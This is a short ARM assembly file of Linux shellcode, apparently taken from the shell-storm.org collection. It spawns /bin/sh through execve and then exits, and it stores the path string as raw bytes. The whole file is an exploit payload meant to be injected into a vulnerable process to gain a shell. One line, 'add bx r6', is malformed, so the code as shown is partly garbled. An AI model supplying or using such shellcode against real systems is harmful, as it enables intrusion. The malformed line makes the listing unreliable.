; Linux/ARM - execve("/bin/sh", [], [0 vars]) - 35 bytes
; http://shell-storm.org/shellcode/files/shellcode-855.php
.section .text
.global _start
_start:
  add     r6, pc, #1
  add     bx      r6
  eors    r0, r0
  add     r0, pc
  adds    r0, #12
  eors    r1, r1
  eors    r2, r2
  movs    r7, #11
  svc     1
  movs    r7, #1
  svc     1
  .short  0x2f2f
  .word   0x2f6e6962
  .short  0x732f
  .byte   0x68
